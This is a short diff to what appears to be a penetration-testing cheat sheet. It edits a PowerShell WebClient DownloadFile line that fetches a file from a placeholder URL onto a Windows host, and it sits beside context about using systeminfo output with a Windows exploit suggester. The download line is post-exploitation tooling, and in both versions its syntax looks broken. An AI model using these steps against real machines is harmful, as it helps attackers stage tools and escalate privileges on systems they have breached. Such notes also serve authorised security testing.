@@ -14,4 +14,4 @@ Set File Attributes (Linux):chattr {arg} {FilePath}
 systeminfo (Download output and run windows exploit suggestor)
 
 $WebClient = New-Object System.Net.WebClient
-$WebClient.DownloadFile("http(s)://URL/file" || file,"C:\path\file")
+$WebClient.DownloadFile("http(s)://URL/file" || file:C:\path\file")
